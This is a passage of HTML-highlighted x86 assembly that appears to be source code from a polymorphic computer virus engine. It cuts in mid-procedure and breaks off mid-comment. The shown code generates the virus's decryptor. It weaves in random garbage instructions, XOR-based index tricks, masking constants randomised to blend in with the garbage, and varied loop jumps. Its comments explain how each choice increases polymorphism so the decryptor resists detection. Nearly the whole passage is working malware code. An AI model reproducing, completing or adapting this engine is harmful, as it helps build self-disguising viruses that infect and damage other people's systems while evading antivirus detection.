                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">    </span><span class="sc1">; Do garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertDecryption</span><span class="sc0">   </span><span class="sc1">; Put the decryption instruction</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_02</span><span class="sc0">      </span><span class="sc1">; Continue</span><span class="sc0">

 </span><span class="sc5">@@NoBufferReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Which action?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@DoubleXORing</span><span class="sc0">       </span><span class="sc1">; Then, double XORing</span><span class="sc0">

</span><span class="sc1">;; We make: PUSH Index2/XOR Index2,Index1/Decrypt using Index2/POP Index2</span><span class="sc0">
      </span><span class="sc5">@@PUSHPOPIndex2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                     </span><span class="sc1">; PUSH Index2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Patch1</span><span class="sc0">            </span><span class="sc1">; XOR the Index2 with the Index1 and</span><span class="sc0">
                                          </span><span class="sc1">; insert the decryption code, mixed</span><span class="sc0">
                                          </span><span class="sc1">; with lots of garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                     </span><span class="sc1">; Insert POP Index2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_02</span><span class="sc0">       </span><span class="sc1">; Continue</span><span class="sc0">

</span><span class="sc1">;; We make: XOR Index2,Index1/Decrypt using Index2/XOR Index2,Index1 (to res-</span><span class="sc0">
</span><span class="sc1">;;  tore the value)</span><span class="sc0">
      </span><span class="sc5">@@DoubleXORing</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Patch1</span><span class="sc0">            </span><span class="sc1">; XOR Index2 with Index1, insert the</span><span class="sc0">
                                          </span><span class="sc1">; decryption instruction and mix it</span><span class="sc0">
                                          </span><span class="sc1">; with garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegReg</span><span class="sc0">       </span><span class="sc1">; XOR again Index2 with Index1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">

    </span><span class="sc5">@@IFC_Next_02</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;; Now we have to modify Index1 and Index2. Since we can code it interleaved</span><span class="sc0">
</span><span class="sc1">;; (each modification is composed of two main instructions) the less difficult</span><span class="sc0">
</span><span class="sc1">;; way to code that is making this. The modification of Index1 is adding a</span><span class="sc0">
</span><span class="sc1">;; random multiple-of-8 value. The modification of Index2 is adding a random</span><span class="sc0">
</span><span class="sc1">;; value between 4 and 7. The masking of Index1 is making the instruction</span><span class="sc0">
</span><span class="sc1">;; AND Index1,Virus_SizePOW2-4, and so is the masking of Index2.</span><span class="sc0">
</span><span class="sc1">;; Little maths: Since Index1 and Index2 are a random number between 0 and</span><span class="sc0">
</span><span class="sc1">;; Virus_SizePOW2, when we add a number to them less than Virus_SizePOW2 (as</span><span class="sc0">
</span><span class="sc1">;; it's the case), the resulting number never will be more than the double of</span><span class="sc0">
</span><span class="sc1">;; Virus_SizePOW2, so the immediate bit above the highest bit set on</span><span class="sc0">
</span><span class="sc1">;; Virus_SizePOW2-4 (in this case, due to the fact that Virus_SizePOW2-4 is</span><span class="sc0">
</span><span class="sc1">;; 7FFCh) is the bit 15. So, if we put in a dword Virus_SizePOW2 - 4 (7FFCh)</span><span class="sc0">
</span><span class="sc1">;; and we left the bit 15 cleared, we can have the rest of bits (16 to 31) set</span><span class="sc0">
</span><span class="sc1">;; to a random state, due to the fact that in Index1 and Index2 are going to</span><span class="sc0">
</span><span class="sc1">;; be always 0. This is a manner of making a confusion of this instruction</span><span class="sc0">
</span><span class="sc1">;; with the garbage ones, since it's a working mask, but it's random in a</span><span class="sc0">
</span><span class="sc1">;; great part of the whole dword.</span><span class="sc0">
</span><span class="sc1">;; So, we select a combination. Between the modification and the masking we</span><span class="sc0">
</span><span class="sc1">;; insert lots of garbage (as always).</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Combination0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Combination1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Combination2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Combination3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Combination4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_02</span><span class="sc0">   </span><span class="sc1">; Select up to 6 combinations</span><span class="sc0">
</span><span class="sc5">@@Combination5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">  </span><span class="sc1">; comb 5: Modify Index2, Modify Index1,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">  </span><span class="sc1">;         Mask Index1, Mask Index2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SubComb1</span><span class="sc0">
</span><span class="sc5">@@Combination0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">  </span><span class="sc1">; comb 0: Modify Index1, Modify Index2,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">  </span><span class="sc1">;         Mask Index1, Mask Index2</span><span class="sc0">
    </span><span class="sc5">@@SubComb1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_03</span><span class="sc0">
</span><span class="sc5">@@Combination1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">  </span><span class="sc1">; Comb 1: Modify Index1, Mask Index1,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex1</span><span class="sc0">    </span><span class="sc1">;         Modify Index2, Mask Index2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_03</span><span class="sc0">
</span><span class="sc5">@@Combination2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">  </span><span class="sc1">; Comb 2: Modify Index1, Modify Index2,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">  </span><span class="sc1">;         Mask Index2, Mask Index1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SubComb2</span><span class="sc0">
</span><span class="sc5">@@Combination3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">  </span><span class="sc1">; Comb 3: Modify Index2, Mask Index2,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex2</span><span class="sc0">    </span><span class="sc1">;         Modify Index1, Mask Index1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@IFC_Next_03</span><span class="sc0">
</span><span class="sc5">@@Combination4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex2</span><span class="sc0">  </span><span class="sc1">; Comb 4: Modify Index2, Modify Index1,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyIndex1</span><span class="sc0">  </span><span class="sc1">;         Mask Index2, Mask Index1</span><span class="sc0">
    </span><span class="sc5">@@SubComb2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MaskIndex1</span><span class="sc0">

</span><span class="sc1">;; When we arrive here, the code to decrypt is already coded. Now we have to</span><span class="sc0">
</span><span class="sc1">;; test if we decrypted all the virus body or we have to continue decrypting.</span><span class="sc0">
     </span><span class="sc5">@@IFC_Next_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoCMP</span><span class="sc0">    </span><span class="sc1">; Do a CMP Index2,InitialValue (or similar)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; JNZ to loop or JZ/JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeJZ</span><span class="sc0">      </span><span class="sc1">; Jump to use JZ</span><span class="sc0">
           </span><span class="sc1">; We make: JNZ Loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850Fh</span><span class="sc0"> </span><span class="sc1">; Insert a JNZ.</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">       </span><span class="sc1">; Store the opcode of JNZ</span><span class="sc0">
    </span><span class="sc5">@@CompleteJZ_JNZ</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsToCompleteNdx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">JumpsToComplete</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Insert the jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; address and increase</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                         </span><span class="sc1">; the index</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpsToCompleteNdx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">       </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoFinalJMP</span><span class="sc0">       </span><span class="sc1">; Make the jump to the decrypted part</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueWithFunctionalCode</span><span class="sc0">
           </span><span class="sc1">; We make: JZ Etiq1 / Garbage / JMP Loop / Etiq1: xxx</span><span class="sc0">
    </span><span class="sc5">@@MakeJZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0"> </span><span class="sc1">; Store the opcode of JZ (short)</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; Make size for displacement</span><span class="sc0">
    </span><span class="sc5">@@MakeJZ_000</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save CALLs indexes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; just in case we have</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to repeat the garbage</span><span class="sc0">
                                                       </span><span class="sc1">; making</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeJZ_001</span><span class="sc0">     </span><span class="sc1">; Jump to continue</span><span class="sc0">
    </span><span class="sc5">@@MakeJZ_003</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">         </span><span class="sc1">; Eliminate the size of the "JMP Loop"</span><span class="sc0">
    </span><span class="sc5">@@MakeJZ_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Save current insertion address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; Add jump size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Get the size of displacement for JZ</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; Displacement = size of JMP?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MakeJZ_003</span><span class="sc0">      </span><span class="sc1">; If it is, repeat (no garbage made)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">        </span><span class="sc1">; under the maximum displacement?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@MakeJZ_OK</span><span class="sc0">       </span><span class="sc1">; If it's below or equal, jump</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; We have to repeat the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; garbage (too many),</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; so we restore the in-</span><span class="sc0">
                                       </span><span class="sc1">; dexes of the calls to eliminate any</span><span class="sc0">
                                       </span><span class="sc1">; posible call made during this garbage</span><span class="sc0">
                                       </span><span class="sc1">; creation</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">; Restore EDI</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeJZ_000</span><span class="sc0">     </span><span class="sc1">; Jump and loop</span><span class="sc0">
   </span><span class="sc5">@@MakeJZ_OK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Eliminate the saved call indexes, since</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; the garbage is made correctly</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Get the displacement in EAX</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Get the index adding in ESI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Complete the JZ</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">; Make the JMP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">   </span><span class="sc1">; Opcode of JMP</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">              </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CompleteJZ_JNZ</span><span class="sc0"> </span><span class="sc1">; Jump to save the address for later</span><span class="sc0">
                                       </span><span class="sc1">; completion </span><span class="sc0">

</span><span class="sc1">;; Since the function Branching is recursive, after this code will be other</span><span class="sc0">
</span><span class="sc1">;; branches and "functional code". This means that if we put in this point the</span><span class="sc0">
</span><span class="sc1">;; subroutines that we want to create, they'll be between code, not at the</span><span class="sc0">
</span><span class="sc1">;; beginning or at the end of the decryptor, technique that increases the</span><span class="sc0">
</span><span class="sc1">;; polymorphysm of the engine alot.</span><span class="sc0">

    </span><span class="sc5">@@ContinueWithFunctionalCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CompleteCalls</span><span class="sc0"> </span><span class="sc1">; Complete calls of level 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CompleteCalls</span><span class="sc0"> </span><span class="sc1">; Complete calls of level 2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CompleteCalls</span><span class="sc0"> </span><span class="sc1">; Complete calls of level 3</span><span class="sc0">

    </span><span class="sc5">@@Completed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Release must-be-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; created calls</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Clear garbage</span><span class="sc0">
                                                </span><span class="sc1">; recursivity set on the func-</span><span class="sc0">
                                                </span><span class="sc1">; tion CompleteCalls</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BranchIdentifier</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">    </span><span class="sc1">; Return from the Branch</span><span class="sc0">
</span><span class="sc5">Branching</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Conditional jumps table</span><span class="sc0">
</span><span class="sc5">Op_CJumps</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">
           </span><span class="sc1">;;      JS,  JNS, JB,  JBE, JA,  JAE, JG,  JL,  JGE, JLE, JZ,  JNZ</span><span class="sc0">

</span><span class="sc5">ArrayOfCalls1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Place to put the addresses to the</span><span class="sc0">
</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; created subroutines. There are three</span><span class="sc0">
</span><span class="sc5">ArrayOfCalls2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; levels, being the first level callable</span><span class="sc0">
</span><span class="sc5">ArrayOfCalls2Ndx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; from the first recursivity level of</span><span class="sc0">
</span><span class="sc5">ArrayOfCalls3</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; garbage, and so on. Once in a subrouti-</span><span class="sc0">
